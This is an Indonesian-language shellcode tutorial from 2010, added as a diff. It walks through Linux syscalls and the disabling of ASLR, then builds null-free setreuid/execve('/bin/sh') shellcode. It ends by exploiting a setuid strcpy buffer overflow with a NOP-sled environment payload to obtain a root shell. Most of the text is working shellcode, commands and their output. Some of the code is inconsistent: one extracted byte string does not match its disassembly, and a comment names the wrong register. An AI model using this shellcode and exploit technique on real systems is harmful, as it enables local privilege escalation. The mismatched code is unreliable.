@@ -1,0 +1,618 @@
+										How to write shellcode tutorial
+										Edisi : Pertama
+							
+Penulis : gunslinger_ <yudha.gunslinger@gmail.com>
+Tanggal : Thu Jul  1 22:10:44 WIT 2010
+
+
+Konten :
+	1. Pendahuluan
+	2. System call ~ syscall
+	3. Disable randomize_va_space first !
+	4. Penggunaan syscall dalam bahasa C
+	5. Shellcode dasar
+	6. Tehnik menghindari "nullbyte"
+		6.1 Gunakan instruksi xor
+		6.2 Gunakan register yang lebih rendah
+	7. Spawning a shell
+	8. Load your shellcode right now !
+	9. Special thanks
+	
+
+
+-- Pendahuluan
+sebelumnya saya telah menulis artikel tentang buffer overflow, sekarang saatnya saya menulis artikel cara menulis shellcode .
+karena dalam pengexploitasian tidak dapat lepas dari shellcode atau payload...
+shellcode adalah sekumpulan instruksi lalu di eksekusi lewat program yang akan di exploitasi.
+shellcode juga bisa menyebabkan kerusakan yang serius . menghapus semua file, membuat komputer hang, memutuskan koneksi internet , mengambil akses root dll .
+itu semua tergantung kebutuhan si pembuat shellcode .
+
+
+
+-- System call ~ syscall
+syscall adalah interface diantara protected kernel mode dan user mode . 
+yang dimaksud protected kernel mode adalah tetap menjaga aplikasi yang dimiliki oleh user (pengguna), tanpa membahayakan sistem operasi .
+syscall sangat powerfull dan mengizinkan kita untuk mengakses sistem operasi dengan fungsi tertentu .
+seperti : menginput data, mengeluarkan output, keluar dari proses, atau mengeksekusi file binary .
+sangat powerfull karena mengizinkan kita langsung mengakses ke kernel .
+system call bisa berjalan di linux lewat software interrupt biasa juga disebut "int 0x80" .
+dimana "int 0x80" tereksekusi dari program user, CPU akan mengarahkan ke dalam kernel mode dan mengeksekusi fungsi syscall.
+linux berbeda dengan unix syscall yang lain , linux menggunakan register untuk performa tertinggi .
+karena register berada dalam prosesor bukan dalam memory .
+untuk membuat syscall bekerja dengan cara berikut :
+1. nomer syscall ditempatkan pada register EAX (al,ah,ax) .
+2. argument syscall ditempatkan pada register lain .
+3. mengeksekusi int 0x80 (interupsi software)
+4. CPU akan mengarahkan ke mode kernel
+5. fungsi syscall tereksekusi
+syscall bisa ditemukan di /usr/include/asm/unistd_32.h . 
+berikut sebagai contoh :
+
+gunslinger@localhost:~/$ more /usr/include/asm/unistd_32.h
+#ifndef _ASM_X86_UNISTD_32_H
+#define _ASM_X86_UNISTD_32_H
+
+/*
+ * This file contains the system call numbers.
+ */
+
+#define __NR_restart_syscall      0
+#define __NR_exit		  1
+#define __NR_fork		  2
+#define __NR_read		  3
+#define __NR_write		  4
+#define __NR_open		  5
+#define __NR_close		  6
+#define __NR_waitpid		  7
+#define __NR_creat		  8
+#define __NR_link		  9
+#define __NR_unlink		 10
+#define __NR_execve		 11
+#define __NR_chdir		 12
+#define __NR_time		 13
+#define __NR_mknod		 14
+#define __NR_chmod		 15
+#define __NR_lchown		 16
+#define __NR_break		 17
+#define __NR_oldstat		 18
+#define __NR_lseek		 19
+#define __NR_getpid		 20
+#define __NR_mount		 21
+#define __NR_umount		 22
+#define __NR_setuid		 23
+#define __NR_getuid		 24
+#define __NR_stime		 25
+#define __NR_ptrace		 26
+#define __NR_alarm		 27
+#define __NR_oldfstat		 28
+#define __NR_pause		 29
+#define __NR_utime		 30
+#define __NR_stty		 31
+#define __NR_gtty		 32
+#define __NR_access		 33
+#define __NR_nice		 34
+#define __NR_ftime		 35
+#define __NR_sync		 36
+#define __NR_kill		 37
+--More--(10%)
+gunslinger@localhost:~/$
+
+Tips :
+untuk lebih lengkap penggunaanya anda bisa menggunakan perintah "man 2" yang berisi linux programmer manual mengenai cara penggunaan syscall .
+contoh : man 2 execve
+secara default memang kebanyakan tidak ada anda bisa mendownloadnya dan menginstallnya dari http://kernel.org
+dengan cara berikut .
+
+gunslinger@localhost:~$ git clone git://git.kernel.org/pub/scm/docs/man-pages/man-pages.git
+
+atau anda bisa melihat secara online di http://www.kernel.org/doc/man-pages/online/pages/man2/syscalls.2.html
+disana kita bisa lihat cara penggunaan syscall pada kernel - kernel terbaru pada saat ini lengkap dengan penjelasannya .
+
+
+
+-- Disable randomize_va_space first !
+ini adalah hal terpenting sebelum memulai, kita harus mematikan randomize_va_space terlebih dahulu .
+tujuannya adalah untuk menghindari "segmentation fault" pada shellcode yang akan kita eksekusikan .
+jika belum dimatikan maka shellcode kita aka mengalami segmentation fault .
+sangat perlu saya ingatkan karena kebanyakan orang lupa mematikan randomize_va_space padahal tidak ada yang salah pada shellcode .
+shellcode mengalami segmentation fault, lalu bingung "apa yang salah dalam shellcode tesebut ?" padahal hanya lupa mematikan randomisasi address .
+berikut cara mematikannya pada kernel 2.6.8 ke atas, harus dengan root asli tidak bisa dengan sudo :
+
+root@localhost:/home/gunslinger/# cat /proc/sys/kernel/randomize_va_space
+2
+root@localhost:/home/gunslinger/# echo 0 > /proc/sys/kernel/randomize_va_space
+root@localhost:/home/gunslinger/# cat /proc/sys/kernel/randomize_va_space
+0
+root@localhost:/home/gunslinger/#
+
+
+
+-- Penggunaan syscall dalam bahasa C
+sebelum kita lanjutkan , kita akan menggunakan syscall dengan bahasa pemrograman tingkat tinggi seperti bahasa C .
+sekarang kita membuat contoh program exit dalam bahasa c .
+
+--------------exit.c--------------
+main()
+{
+       exit(0);
+}
+---------------EOF----------------
+
+save dengan nama exit.c dan compile . 
+perhatian : compile dengan opsi -static untuk menghindari dinamic linking .
+
+gunslinger@localhost:~/$ gcc -static -o exit exit.c
+exit.c: In function ‘main’:
+exit.c:3: warning: incompatible implicit declaration of built-in function ‘exit’
+gunslinger@localhost:~/$
+
+kemudian kita disassemble binary tersebut .
+
+gunslinger@localhost:~/$ gdb exit
+GNU gdb 6.8-debian
+Copyright (C) 2008 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i486-linux-gnu"...
+(gdb) disas _exit
+Dump of assembler code for function _exit:
+0x0804e6e0 <_exit+0>:	mov    0x4(%esp),%ebx
+0x0804e6e4 <_exit+4>:	mov    $0xfc,%eax
+0x0804e6e9 <_exit+9>:	int    $0x80
+0x0804e6eb <_exit+11>:	mov    $0x1,%eax
+0x0804e6f0 <_exit+16>:	int    $0x80
+0x0804e6f2 <_exit+18>:	hlt    
+End of assembler dump.
+(gdb)
+
+disitu terlihat kita menggunakan 2 syscall . dan syscall exit .
+perhatikan berikut dibawah ini :
+
+0x0804e6eb <_exit+11>:	mov    $0x1,%eax
+0x0804e6f0 <_exit+16>:	int    $0x80
+
+kita mengisi register eax dengan angka 1 .
+dan itu syscall exit, lalu kita memanggil software interupt sehingga program kita menjadi exit .
+
+
+
+
+-- Shellcode dasar
+ok, sebelumnya kita telah menggunakan syscall exit lewat bahasa c .
+sekarang kita gunakan bahasa assembly .
+berikut adalah program tersebut .
+
+----------------------------exit.asm----------------------------
+global _start
+
+_start:
+
+	mov 	eax,1	; syscall nomer 1 exit	
+	mov 	ebx,0	; argumen 0 diletakan di ebx jadi exit(0)
+	int 	0x80
+-------------------------------EOF--------------------------------- 
+
+lalu compile program tersebut dan jalankan program tersebut .
+
+gunslinger@localhost:~/$ nasm -f elf exit.asm
+gunslinger@localhost:~/$ ld -s -o exit exit.o
+gunslinger@localhost:~/$ ./exit
+gunslinger@localhost:~/$
+
+ok sekarang kita siap untuk mengambil opcode dari program tersebut .
+kali ini kita menggunakan objdump untuk mengambil opcode dalam program tersebut .
+
+gunslinger@localhost:~/$ objdump -d exit
+
+exit:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <.text>:
+ 8048060:	b8 01 00 00 00       	mov    $0x1,%eax
+ 8048065:	bb 00 00 00 00       	mov    $0x0,%ebx
+ 804806a:	cd 80                	int    $0x80
+gunslinger@localhost:~/$
+
+terlihat bahwa kode assembly di sebelah kanan dan opcode berada ditengah .
+sekarang kita ambil opcode tersebut . dan ubah ke bentuk shellcode .
+kita bisa gunakan grep, cut, tr, paste, dan sed untuk mempersingkat waktu pengambilan opcode tersebut .
+dengan cara berikut :
+
+gunslinger@localhost:~/$ objdump -d ./exit|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80"
+gunslinger@localhost:~/$
+
+lalu kita test lewat exitshellcode.c 
+
+------------------------------shellcodetest.c----------------------------------
+char shellcode[] = "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80";
+
+int main(void)
+{
+	(*(void(*)()) shellcode)();
+}
+------------------------------------EOF-----------------------------------------
+
+compile program dan eksekusi tersebut .
+
+gunslinger@localhost:~/$ cat shellcodetest.c
+char shellcode[] = "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80";
+
+int main(void)
+{
+	(*(void(*)()) shellcode)();
+}
+gunslinger@localhost:~/$ gcc -o shellcodetest shellcodetest.c
+gunslinger@localhost:~/$ ./shellcodetest
+gunslinger@localhost:~/$
+
+program berjalan dan exit . namun apakah itu exit karena shellcode kita ?
+kita bisa gunakan fungsi strlen() pada bahasa C untuk membuktikan apakah shellcode kita yang membuat program tadi menjadi exit .
+
+-------------------------------shellcodetest.c---------------------------------
+#include <stdio.h> // standar input output library
+
+char shellcode[] = "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80";
+
+int main(void)
+{
+	fprintf(stdout,"Length: %d\n",strlen(shellcode)); 
+	(*(void(*)()) shellcode)();
+}
+------------------------------------EOF----------------------------------------
+
+compile dan run .
+
+gunslinger@localhost:~/$ gcc -o shellcodetest shellcodetest.c
+shellcodetest.c: In function ‘main’:
+shellcodetest.c:7: warning: incompatible implicit declaration of built-in function ‘strlen’
+gunslinger@localhost:~/$ ./shellcodetest
+Length: 2
+gunslinger@localhost:~/$
+
+ternyata yang membuat program kita menjadi exit bukan karena shellcode kita .
+perhatikan berikut :
+-> Length: 2
+sebenarnya shellcode kita memiliki, panjang 12 byte .
+tetapi karena adanya string "\x00" string kita menjadi terputus .
+itu disebut nullbyte atau terminate string, nullbyte dalam bahasa c bisa memutuskan string yang sesudahnya .
+seperti halnya teknik hacking menggunakan lfi (local file inclusion) jika anda memberi nullbyte pada suatu variablenya , maka string sesudahnya akan terputus sampai di nullbyte saja .
+itu dikarenakan interpreter php menggunakan bahasa c .
+selanjutnya kita akan membahas tehnik penghindaran nullbytes .
+
+
+-- Tehnik menghindari "nullbyte"
+sebelumnya kita telah membuat shellcode exit, akan tetapi kita mendapatkan nullbyte sehingga string kita menjadi terputus .
+sehingga shellcode kita tidak bisa bekerja dengan baik .
+sekarang kita akan membahas cara menghindari nullbyte .
+mari kita balik ke assembly program exit sebelumnya .
+
+----------------------------exit.asm-------------------------------
+global _start
+
+_start:
+
+	mov 	eax,1	; syscall nomer 1 exit	
+	mov 	ebx,0	; argumen 0 diletakan di ebx jadi exit(0)
+	int 	0x80
+-------------------------------EOF--------------------------------- 
+
+- Gunakan instruksi xor
+lalu bagaimana cara menghindarinya ? , pertama kita gunakan instruksi exclusive OR (XOR) pada bahasa assembly .
+jika kedua operand tersebut bernilai sama, maka instruksi xor akan menjadikan register tersebut bernilai nol (0).
+
+mov 	ebx,0	; register ebx bernilai nol
+
+ganti dengan
+
+xor ebx,ebx	; register ebx juga bernilai nol
+
+- Gunakan register yang lebih rendah
+kedua, kita tahu bahwa "mov 	eax,1" juga menghasilkan nullbyte, lalu bagaimana caranya agar tidak ada nullbyte ? .
+kita bisa gunakan register yang lebih rendah dari "eax" (32 bit register) menggunakan register yang lebih rendah "al" (low - 8 bit register)
+keduanya sama saja, hanya saja eax lebih tinggi karena register "eax" adalah register 32 bit , lalu "al" adalah register 8 bit rendah .
+
+mov 	eax,1
+
+ganti dengan
+
+mov	al,1
+
+lalu exit.asm kita akan menjadi seperti berikut : 
+
+----------------------------exitnew.asm----------------------------
+global _start
+
+_start:
+
+	mov 	al,1	; syscall nomer 1 exit	
+	xor 	ebx,ebx	; argumen 0 diletakan di ebx jadi exit(0)
+	int 	0x80
+-------------------------------EOF--------------------------------- 
+
+compile dan linking program tersebut .
+
+gunslinger@localhost:~/$ nasm -f elf exitnew.asm
+gunslinger@localhost:~/$ ld -s -o exitnew exitnew.o
+
+lalu kita gunakan lagi objdump untuk membuktikan apakah shellcode masih mengandung "nullbyte" atau tidak .
+
+gunslinger@localhost:~/$ objdump -d exitnew
+
+exitnew:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <.text>:
+ 8048060:	b0 01                	mov    $0x1,%al
+ 8048062:	31 db                	xor    %ebx,%ebx
+ 8048064:	cd 80                	int    $0x80
+gunslinger@localhost:~/$ 
+
+kita telah sukses menghindari nullbyte .
+sebenarnya ada banyak cara menghindari nullbyte .
+tetapi jika anda sering melakukan experiment dan shellcode programming, itu adalah hal yang mudah .
+
+
+
+-- Spawning a shell
+kebanyakan tujuan pembuat shellcode membuat shellcode adalah untuk menginjeksi file binary bersuid, 
+dan mendapatkan akses shell "/bin/sh" sesuai dengan id si pemilik file binary bersuid tersebut .
+contoh menginjeksi file binary yang vulnerable terhadap serangan buffer overflow, heap overflow, format string, seh dan lain2 .
+kali ini kita akan membuat shellcode yang memberikan kita shell .
+kita balik lagi ke bahasa pemrograman lebih tinggi, dalam bahasa c cara membuat akses shell dengan setreuid 0,0 lewat syscall dengan cara berikut .
+
+----------------------------shell.c----------------------------
+#include <unistd.h>			// include dengan daftar syscall
+
+main()
+{
+	setreuid(0,0);			// syscall nomer 70 dengan argumen 0,0
+	execve("/bin/sh",NULL,NULL);	// syscall nomer 11 dengan argumen "/bin/sh",null,null
+	return (0);
+}
+------------------------------EOF------------------------------
+
+compile program tersebut lalu tes dengan suid root .
+lalu eksekusi file binary tersebut .
+
+gunslinger@localhost:~/$ gcc -o shell shell.c
+gunslinger@localhost:~/$ sudo chown root:root shell
+[sudo] password for gunslinger: 
+gunslinger@localhost:~/$ sudo chmod 4755 shell
+gunslinger@localhost:~/$ ./shell
+# id
+uid=0(root) gid=1000(gunslinger) groups=4(adm),20(dialout),24(cdrom),46(plugdev),106(lpadmin),121(admin),122(sambashare),1000(gunslinger)
+# whoami
+root
+# exit
+gunslinger@localhost:~/$
+
+shell tersebut memberikan akses root karena sebelumnya kita telah mendrop akses root ke dalam file tersebut dengan setreuid 0,0 .
+metode dalam penginjeksian shellcode fungsi setreuid adalah mendrop akses userid si user file binary tersebut .
+maka fungsi syscall setreuid adalah hal yang juga sangat penting dalam shellcode .
+ok, sekarang saatnya kita membuat shellcode yang memberikan kita akses "/bin/sh" dengan setreuid juga .
+sekarang kita harus membuatnya dari bahasa tingkat rendah yaitu assembly .
+pertama kita bisa gunakan python, untuk mengconversi string "/bin/sh" ke bentuk hexadesimal. 
+lalu kita ubah ke bentuk little endian karena kita tahu bahwa struktur stack adalah lifo (last in first out) .
+
+gunslinger@localhost:~/$ python
+Python 2.6.2 (release26-maint, Apr 19 2009, 01:56:41) 
+[GCC 4.3.3] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import binascii
+>>> print "hs//".encode("hex")
+68732f2f
+>>> print "nib/".encode("hex")
+6e69622f
+>>> quit()
+gunslinger@localhost:~/$
+
+kita telah mendapatkan string "/bin/sh" dalam hexadesimal dan dalam bentuk little endian .
+
+68732f2f
+6e69622f
+
+kita tambahkan "0x" agar assembly mengerti itu adalah bilangan hexadesimal .
+
+0x68732f2f
+0x6e69622f
+
+kita telah mendapatkan string "/bin/sh" dalam intel assembly .
+saatnya ke program utama .
+
+----------------------------shell.asm----------------------------
+global _start
+
+_start:
+
+	xor 	eax,eax		; pertama kita membersihkan register terlebih dahulu
+	xor 	ebx,ebx
+	xor 	ecx,ecx
+	xor 	edx,edx
+
+	;setreuid (0,0)
+	mov	al,70		; syscall nomer 70 ~ setreuid
+	xor	ebx,ebx		; argumen pertama diletakan pada register ebx, instruksi xor pada kedua operand yang sama, maka menghasilkan nol (NULL) ~ seteruid(0,
+	xor	ecx,ecx		; argumen kedua diletakan pada register ecx, instruksi xor pada kedua operand yang sama, maka menghasilkan nol (NULL) ~ setreuid(0,0)
+	int	0x80		; panggil interupsi software, kerjakan !
+
+	; execve ("/bin//sh",NULL,NULL)
+	mov	al,11		; syscall nomer 11 ~ execve
+	push	ebx		; dorong register ebx kedalam stack  ~ execve(
+	push	0x68732f2f	; dorong string "sh//" kedalam stack
+	push	0x6e69622f	; dorong string "nib/" kedalam stack
+	mov	ebx,esp		; copykan isi stack pointer ke register ebx, sekarang isi register ebx adalah "/bin//sh" ~ execve("/bin//sh",
+	xor	ecx,ecx		; argumen kedua diletakan pada register ecx, instruksi xor pada kedua operand yang sama, maka menghasilkan nol (NULL) ~ execve("/bin//sh",NULL,
+	xor	ecx,ecx		; argumen kedua diletakan pada register edx, instruksi xor pada kedua operand yang sama, maka menghasilkan nol (NULL) ~ execve("/bin//sh",NULL,NULL)
+	push	ebx		; dorong register ebx kedalam stack ~ execve("/bin//sh",NULL,NULL)
+	int	0x80		; panggil interupsi software, kerjakan !
+--------------------------------EOF----------------------------------
+
+compile dan linking program tersebut dengan root.
+setelah itu beri suid root ke program tersebut lalu jalankan dengan user biasa .
+
+root@localhost:/home/gunslinger/# nasm -f elf shell.asm
+root@localhost:/home/gunslinger/# ld -s -o shell shell.o
+root@localhost:/home/gunslinger/# chown root:root shell
+root@localhost:/home/gunslinger/# chmod 4755 shell
+root@localhost:/home/gunslinger/# exit
+gunslinger@localhost:~/$ ./shell
+# id
+uid=0(root) gid=1000(gunslinger) groups=4(adm),20(dialout),24(cdrom),46(plugdev),106(lpadmin),121(admin),122(sambashare),1000(gunslinger)
+# whoami
+root
+# exit
+gunslinger@localhost:~/$
+
+program berjalan dengan baik, sekarang saatnya kita mengambil opcode file binary tersebut dengan objdump .
+
+gunslinger@localhost:~/$ objdump -d shell
+
+shell:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <.text>:
+ 8048060:	31 c0                	xor    %eax,%eax
+ 8048062:	31 db                	xor    %ebx,%ebx
+ 8048064:	31 c9                	xor    %ecx,%ecx
+ 8048066:	31 d2                	xor    %edx,%edx
+ 8048068:	b0 46                	mov    $0x46,%al
+ 804806a:	31 db                	xor    %ebx,%ebx
+ 804806c:	31 c9                	xor    %ecx,%ecx
+ 804806e:	cd 80                	int    $0x80
+ 8048070:	b0 0b                	mov    $0xb,%al
+ 8048072:	53                   	push   %ebx
+ 8048073:	68 2f 2f 73 68       	push   $0x68732f2f
+ 8048078:	68 2f 62 69 6e       	push   $0x6e69622f
+ 804807d:	89 e3                	mov    %esp,%ebx
+ 804807f:	31 c9                	xor    %ecx,%ecx
+ 8048081:	31 c9                	xor    %ecx,%ecx
+ 8048083:	53                   	push   %ebx
+ 8048084:	cd 80                	int    $0x80
+gunslinger@localhost:~/$ objdump -d ./shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xc9\xcd\x80\x31\xc0\xb0\x0b\x31\xdb\xcd\x80"
+gunslinger@localhost:~/$
+
+test run dengan shellcodetest.c
+
+-------------------------------shellcodetest.c---------------------------------
+char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x46\x31\xdb\x31"
+		   "\xc9\xcd\x80\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f"
+		   "\x62\x69\x6e\x89\xe3\x31\xc9\x31\xc9\x53\xcd\x80";
+
+int main(void)
+{
+	(*(void(*)()) shellcode)();
+}
+------------------------------------EOF----------------------------------------
+
+compile tersebut dengan root.
+setelah itu beri suid root ke program tersebut lalu jalankan dengan user biasa .
+
+root@localhost:/home/gunslinger/# vim shellcodetest.c
+root@localhost:/home/gunslinger/# cat shellcodetest.c
+char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x46\x31\xdb\x31"
+		   "\xc9\xcd\x80\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f"
+		   "\x62\x69\x6e\x89\xe3\x31\xc9\x31\xc9\x53\xcd\x80";
+
+int main(void)
+{
+	(*(void(*)()) shellcode)();
+}
+root@localhost:/home/gunslinger/# gcc -o shellcodetest shellcodetest.c
+root@localhost:/home/gunslinger/# chown root:root shellcodetest.c
+root@localhost:/home/gunslinger/# chmod 4755 shellcodetest
+root@localhost:/home/gunslinger/# exit
+gunslinger@localhost:~/$ ./shellcodetest
+# id
+uid=0(root) gid=1000(gunslinger) groups=4(adm),20(dialout),24(cdrom),46(plugdev),106(lpadmin),121(admin),122(sambashare),1000(gunslinger)
+# whoami
+root
+# echo GAME is NOT OVER YET
+GAME is NOT OVER YET
+# exit
+gunslinger@localhost:~/$
+
+kita telah sukses membuat shellcode shell menggunakan setreuid(0,0) .
+tetapi permainan belum berakhir sampai disini .
+
+-- Load your shellcode right now !
+ok, kita sudah berada di puncak akhir game pada tutorial edisi pertama .
+sekarang saatnya kita injeksi shellcode kita kedalam aplikasi yang rentan pada serangan buffer overflow .
+saya sudah membahas tehnik exploitasi buffer overflow sebelumnya dan kita akan pakai aplikasi bof2.c .
+tersedia pada link berikut : http://www.exploit-db.com/papers/14108/
+
+let's start our game...
+
+gunslinger@localhost:~/$ vim bof2.c
+gunslinger@localhost:~/$ cat bof2.c
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char** argv)
+{
+        char buffer[10];
+        strcpy(buffer, argv[1]);
+
+        return 0;
+}
+gunslinger@localhost:~/$ vim getenv.c
+gunslinger@localhost:~/$ cat getenv.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char** argv)
+{
+        printf("%s terletak pada address %p\n", argv[1], getenv(argv[1]));
+        return (0);
+}
+gunslinger@localhost:~/$ gcc -o bof2 -g -fno-stack-protector -mpreferred-stack-boundary=2 bof2.c
+gunslinger@localhost:~/$ sudo chown root:root bof2
+[sudo] password for gunslinger: 
+gunslinger@localhost:~/$ sudo chmod 4755 bof2
+gunslinger@localhost:~/$ gcc -o getenv getenv.c
+gunslinger@localhost:~/$ objdump -d ./shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xc9\x53\xcd\x80"
+gunslinger@localhost:~/$ echo -ne "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xc9\x53\xcd\x80" > shellcode.bin
+gunslinger@localhost:~/$ cat shellcode.bin
+1�1�1�1ҰF1�1�̀�
+              Sh//shh/bin��1�1�S̀gunslinger@localhost:~/$ 
+gunslinger@localhost:~/$ export PAYLOAD=$(perl -e 'print "\x90" x 200')$(cat shellcode.bin)
+gunslinger@localhost:~/$ echo $PAYLOAD
+��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1�1ҰF1�1�̀�
+                                     Sh//shh/bin��1�1�S̀
+gunslinger@localhost:~/$ ./getenv PAYLOAD
+PAYLOAD terletak pada address 0xbffffe89
+gunslinger@localhost:~/$ printf "%x\n" $((0xbffffe89 + 100))
+bffffeed
+gunslinger@localhost:~/$ echo "converted in little endian shellcode : \xed\xfe\xff\xbf"
+converted in little endian shellcode : \xed\xfe\xff\xbf
+gunslinger@localhost:~/$ ./bof2 $(perl -e 'print "\xed\xfe\xff\xbf" x 10')
+Segmentation fault
+gunslinger@localhost:~/$ ./bof2 $(perl -e 'print "\x90" x 2 . "\xed\xfe\xff\xbf" x 10')
+# id
+uid=0(root) gid=1000(gunslinger) groups=4(adm),20(dialout),24(cdrom),46(plugdev),106(lpadmin),121(admin),122(sambashare),1000(gunslinger)
+# whoami
+root
+# uname -a
+Linux localhost 2.6.28-11-generic #42-Ubuntu SMP Fri Apr 17 01:57:59 UTC 2009 i686 GNU/Linux
+# echo GAMEOVER...
+GAMEOVER...
+# exit
+gunslinger@localhost:~/$ 
+
+GAMEOVER...
+
+-- Special thanks : devilzc0de crew and jasakom crew and inj3ct0r crew
+		  : www.devilzc0de.org / www.devilzc0de.com , www.inj3ct0r.com / 0xr00t.com 
+		  : www.jasakom.com , www.indonesianhacker.org, www.yogyacarderlink.web.id
+		  : serverisdown.org, xc0de.or.id, echo.or.id, hacker-newbie.org, tecon-crew.org
+		  : And all exploit database...
